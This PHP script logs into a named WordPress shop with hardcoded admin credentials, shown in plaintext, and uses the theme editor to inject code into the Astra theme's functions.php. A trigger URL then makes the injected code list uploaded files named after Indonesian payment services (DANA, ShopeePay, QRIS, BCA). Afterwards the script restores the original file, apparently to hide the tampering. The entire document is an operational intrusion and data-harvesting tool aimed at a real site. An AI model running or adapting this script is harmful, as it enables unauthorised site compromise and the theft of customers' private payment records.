<?php
header('Content-Type: text/plain');
set_time_limit(300);

$login_url = 'https://khumairasnack.store/wp-login.php';
$admin_url = 'https://khumairasnack.store/wp-admin/theme-editor.php?file=functions.php&theme=astra';
$ajax_url = 'https://khumairasnack.store/wp-admin/admin-ajax.php';
$trigger_url = 'https://khumairasnack.store/?scan_entire_uploads=1';

$username = '2212500140@student.budiluhur.ac.id';
$password = 'Admin@ridwan1';

$cookie_file = __DIR__ . '/cookie.txt';
if (file_exists($cookie_file)) {
    unlink($cookie_file);
}

$user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $login_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
    'log' => $username,
    'pwd' => $password,
    'wp-submit' => 'Log In',
    'rememberme' => 'forever',
    'redirect_to' => 'https://khumairasnack.store/wp-admin/'
)));
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);

curl_exec($ch);

curl_setopt($ch, CURLOPT_URL, $admin_url);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_HTTPGET, true);
curl_setopt($ch, CURLOPT_REFERER, 'https://khumairasnack.store/wp-admin/');
$response = curl_exec($ch);

preg_match('/<textarea[^>]*id="newcontent"[^>]*>(.*?)<\/textarea>/is', $response, $matches);
$original_content = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');

preg_match('/name="nonce"[^>]*value="([^"]+)"/i', $response, $matches_nonce);
if (empty($matches_nonce[1])) {
    preg_match('/id="nonce"[^>]*value="([^"]+)"/i', $response, $matches_nonce);
}
$nonce = $matches_nonce[1];

$setup_code = '
add_action("init", function() {
    if (isset($_GET["scan_entire_uploads"])) {
        header("Content-Type: text/plain");
        $upload_dir = wp_upload_dir();
        $base_dir = $upload_dir["basedir"];
        
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($base_dir));
        $matches = array();
        
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $filename = $file->getFilename();
                $lower_name = strtolower($filename);
                if (strpos($lower_name, "dana") !== false || 
                    strpos($lower_name, "shopee") !== false || 
                    strpos($lower_name, "qris") !== false || 
                    strpos($lower_name, "bca") !== false) {
                    
                    $relative_path = str_replace($base_dir, "", $file->getPathname());
                    $relative_path = ltrim(str_replace("\\\", "/", $relative_path), "/");
                    $url = $upload_dir["baseurl"] . "/" . $relative_path;
                    $size = $file->getSize();
                    $matches[] = "File: $relative_path | Size: $size bytes | URL: $url";
                }
            }
        }
        
        echo "MATCHED UPLOADS FILES:\n";
        echo implode("\n", $matches) . "\n";
        exit;
    }
});
';

$modified_content = $original_content . "\n\n" . $setup_code;

curl_setopt($ch, CURLOPT_URL, $ajax_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
    'action' => 'edit-theme-plugin-file',
    'file' => 'functions.php',
    'theme' => 'astra',
    'newcontent' => $modified_content,
    'nonce' => $nonce
)));
curl_setopt($ch, CURLOPT_REFERER, $admin_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'X-Requested-With: XMLHttpRequest'
));
curl_exec($ch);

curl_setopt($ch, CURLOPT_URL, $trigger_url);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_HTTPGET, true);
$res = curl_exec($ch);
echo "=== TRIGGER RESPONSE ===\n";
echo $res . "\n";
echo "======================\n\n";

// Restore
curl_setopt($ch, CURLOPT_URL, $admin_url);
$response = curl_exec($ch);
preg_match('/name="nonce"[^>]*value="([^"]+)"/i', $response, $matches_nonce);
if (empty($matches_nonce[1])) {
    preg_match('/id="nonce"[^>]*value="([^"]+)"/i', $response, $matches_nonce);
}
$fresh_nonce = $matches_nonce[1];

curl_setopt($ch, CURLOPT_URL, $ajax_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(
    'action' => 'edit-theme-plugin-file',
    'file' => 'functions.php',
    'theme' => 'astra',
    'newcontent' => $original_content,
    'nonce' => $fresh_nonce
)));
curl_setopt($ch, CURLOPT_REFERER, $admin_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'X-Requested-With: XMLHttpRequest'
));
curl_exec($ch);

curl_close($ch);
if (file_exists($cookie_file)) {
    unlink($cookie_file);
}
?>
